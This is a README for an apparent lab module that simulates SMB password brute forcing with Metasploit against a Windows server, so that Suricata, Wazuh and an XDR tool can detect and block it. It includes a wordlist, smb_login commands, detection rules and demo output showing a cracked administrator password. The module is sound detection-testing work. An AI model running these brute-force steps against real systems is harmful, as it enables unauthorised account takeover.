# SMB Bruteforce Attack Module

Simulates SMB credential brute force attacks using Metasploit Framework.

## MITRE ATT&CK Mapping

| Technique ID | Technique Name                            | Description                      |
| ------------ | ----------------------------------------- | -------------------------------- |
| T1110.001    | Brute Force: Password Guessing            | Try multiple passwords to log in |
| T1021.002    | Remote Services: SMB/Windows Admin Shares | Access SMB shares remotely       |

## Components

```
src/smb-bruteforce/
├── smb_bruteforce.sh        # Main attack script
├── config.json              # Attack configuration
├── suricata.local.rules     # Detection rules (SID 9004001-9004010)
└── README.md                # This file
```

## Configuration

**config.json:**
```json
{
    "target": {
        "host": "192.168.85.115",
        "port": 445,
        "username": "administrator"
    },
    "attack": {
        "password_file": "/home/kali/demo-pass.txt",
        "threads": 4,
        "stop_on_success": false
    }
}
```

## Attack Flow

```
┌─────────────────┐         ┌─────────────────┐         ┌─────────────────┐
│  Kali Linux     │         │   Suricata      │         │  Windows Server │
│  (Attacker)     │────────>│   (IDS)         │────────>│  (Target)       │
│  192.168.71.100 │         │                 │         │  192.168.85.115 │
└─────────────────┘         └─────────────────┘         └─────────────────┘
        │                          │
        │ 1. ./smb_bruteforce.sh
        │ 2. Metasploit smb_login module
        │ 3. Try each password in wordlist
        │ 4. SMB negotiate + session setup
        │                          │
        │                    5. Suricata detect SID 9004001-9004010
        │                    6. Windows Event ID 4625 (Failed Logon)
        │                    7. Alert -> Wazuh -> SmartXDR
        │                          │
        v                          v
   [Credential Found]        [Block Attacker IP]
```

## Execution

**Requirements:**
- Kali Linux with Metasploit Framework
- jq (for parsing config.json)
- Password wordlist file

**Preparation:**
```bash
# Create password wordlist
cat > /home/kali/demo-pass.txt << 'EOF'
password
123456
administrator
admin123
Password1
Welcome1
P@ssw0rd
Administrator
EOF
```

**Run attack:**
```bash
cd src/smb-bruteforce
chmod +x smb_bruteforce.sh
./smb_bruteforce.sh
```

**Or run manually with Metasploit:**
```bash
msfconsole -q

use auxiliary/scanner/smb/smb_login
set RHOSTS 192.168.85.115
set SMBUser administrator
set PASS_FILE /home/kali/demo-pass.txt
set THREADS 4
set STOP_ON_SUCCESS false
run
```

## Detection Rules (Suricata)

```
# SID 9004001: SMB Connection Flood
alert tcp any any -> $HOME_NET 445 (msg:"SMB Bruteforce - Multiple Connection Attempts"; threshold:type both,track by_src,count 10,seconds 60; sid:9004001;)

# SID 9004005: Metasploit Scanner
alert tcp any any -> $HOME_NET 445 (msg:"SMB Bruteforce - Metasploit Scanner Detected"; sid:9004005;)

# SID 9004007: Failed Authentication Pattern
alert tcp $HOME_NET 445 -> any any (msg:"SMB Bruteforce - Multiple Login Failures"; sid:9004007;)
```

## Windows Event IDs

| Event ID | Description                           |
| -------- | ------------------------------------- |
| 4625     | An account failed to log on           |
| 4624     | An account was successfully logged on |
| 4776     | NTLM authentication attempt           |
| 4740     | A user account was locked out         |

## Expected Results

| Component | Action                                 |
| --------- | -------------------------------------- |
| Suricata  | Alert SID 9004001-9004010              |
| Windows   | Event ID 4625 (multiple failed logons) |
| Wazuh     | Rule trigger -> Active Response        |
| SmartXDR  | Classify: ATTACK -> Block Attacker IP  |

## Demo Output

```
[*] 192.168.85.115:445 - 192.168.85.115:445 - Starting SMB login bruteforce
[-] 192.168.85.115:445 - 192.168.85.115:445 - Failed: '\administrator:password'
[-] 192.168.85.115:445 - 192.168.85.115:445 - Failed: '\administrator:123456'
[-] 192.168.85.115:445 - 192.168.85.115:445 - Failed: '\administrator:admin123'
[+] 192.168.85.115:445 - 192.168.85.115:445 - Success: '\administrator:administartor!@#' Administrator
[*] Auxiliary module execution completed
```
